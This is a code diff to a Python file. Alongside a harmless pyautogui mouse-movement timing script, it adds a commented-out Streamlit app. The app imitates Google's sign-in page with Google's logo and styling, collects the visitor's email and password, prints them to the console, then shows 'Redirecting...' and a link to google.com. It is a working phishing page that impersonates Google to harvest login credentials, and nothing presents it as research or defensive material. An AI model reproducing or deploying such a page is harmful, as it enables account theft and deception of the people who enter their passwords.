@@ -1,10 +1,151 @@
+# import streamlit as st
+# import time
+#
+#
+# def main():
+#     st.set_page_config(page_title="Google Sign In", page_icon="🔒")
+#
+#     if "step" not in st.session_state:
+#         st.session_state["step"] = "email"
+#
+#     st.markdown("""
+#         <style>
+#             @import url('https://fonts.googleapis.com/css2?family=Roboto:wght@400;500&display=swap');
+#             * {
+#                 margin: 0;
+#                 padding: 0;
+#                 box-sizing: border-box;
+#                 font-family: 'Roboto', sans-serif;
+#             }
+#             body {
+#                 display: flex;
+#                 justify-content: center;
+#                 align-items: center;
+#                 height: 100vh;
+#                 background-color: #fff;
+#             }
+#             .container {
+#                 max-width: 450px;
+#                 padding: 40px;
+#                 border-radius: 8px;
+#                 box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
+#                 text-align: center;
+#                 overflow: hidden;
+#             }
+#             .top-content img {
+#                 width: 75px;
+#                 margin-bottom: 10px;
+#             }
+#             h2 {
+#                 font-weight: 500;
+#                 font-size: 24px;
+#                 margin-bottom: 8px;
+#             }
+#             .heading {
+#                 color: #5f6368;
+#                 font-size: 16px;
+#                 margin-bottom: 20px;
+#             }
+#             .input {
+#                 width: 100%;
+#                 padding: 15px;
+#                 font-size: 16px;
+#                 border: 1px solid #ccc;
+#                 border-radius: 4px;
+#                 outline: none;
+#                 margin-bottom: 10px;
+#             }
+#             .next-btn {
+#                 background-color: #1a73e8;
+#                 color: white;
+#                 padding: 10px 20px;
+#                 font-size: 14px;
+#                 border: none;
+#                 border-radius: 4px;
+#                 cursor: pointer;
+#                 margin-top: 10px;
+#             }
+#             .next-btn:hover {
+#                 background-color: #1765c0;
+#             }
+#             .loading {
+#                 width: 25px;
+#                 height: 25px;
+#                 border: 3px solid rgba(0, 0, 0, 0.2);
+#                 border-top: 3px solid #1a73e8;
+#                 border-radius: 50%;
+#                 animation: spin 1s linear infinite;
+#                 margin: 10px auto;
+#                 display: block;
+#             }
+#             @keyframes spin {
+#                 0% { transform: rotate(0deg); }
+#                 100% { transform: rotate(360deg); }
+#             }
+#         </style>
+#     """, unsafe_allow_html=True)
+#
+#     st.markdown("""
+#         <div class='container'>
+#             <div class='top-content'>
+#                 <img src='https://i.postimg.cc/CL7CmGSx/google-logo-png-29530.png' width='100'/>
+#                 <h2>Sign in</h2>
+#                 <p class='heading'>Use your Google Account</p>
+#             </div>
+#         </div>
+#     """, unsafe_allow_html=True)
+#
+#     if st.session_state["step"] == "email":
+#         email = st.text_input("Email or phone", key="email_input")
+#         if st.button("Next", key="next_email"):
+#             if email:
+#                 st.session_state["email"] = email
+#                 st.session_state["step"] = "loading"
+#                 st.rerun()
+#             else:
+#                 st.error("Please enter your email.")
+#
+#     elif st.session_state["step"] == "loading":
+#         st.markdown("<div class='loading'></div>", unsafe_allow_html=True)
+#         with st.spinner("Processing..."):
+#             time.sleep(1.5)
+#         st.session_state["step"] = "password"
+#         st.rerun()
+#
+#     elif st.session_state["step"] == "password":
+#         password = st.text_input("Enter your password", type="password", key="password_input")
+#         if st.button("Next", key="next_password"):
+#             if password:
+#                 st.session_state["password"] = password
+#                 print(f"Email: {st.session_state['email']}, Password: {st.session_state['password']}")
+#                 st.success("Redirecting...")
+#                 time.sleep(1.5)
+#                 st.markdown("[Continue to Google](https://www.google.com)")
+#             else:
+#                 st.error("Please enter your password.")
+#
+#
+# if __name__ == "__main__":
+#     main()
+
 import pyautogui
 import time
-x = 0
+import math
 start = time.time()
-while x < 100:
-    pyautogui.moveRel(2,2, _pause=False)
-    x+=1
+i = 0
+while i < 50:
+    x = 0
+    print(i)
+    while x < 20:
+        #off = pow(abs(20*x), 1/3)
+        pyautogui.moveRel(i,0, _pause=False)
+        x+=1
+    x = 0
+    while x < 20:
+        #off = pow(abs(20*x), 1/3)
+        pyautogui.moveRel(-i,0, _pause=False)
+        x+=1
+    i += 5
 end = time.time()
 
 print(f"Took {end - start:,.2f} seconds")
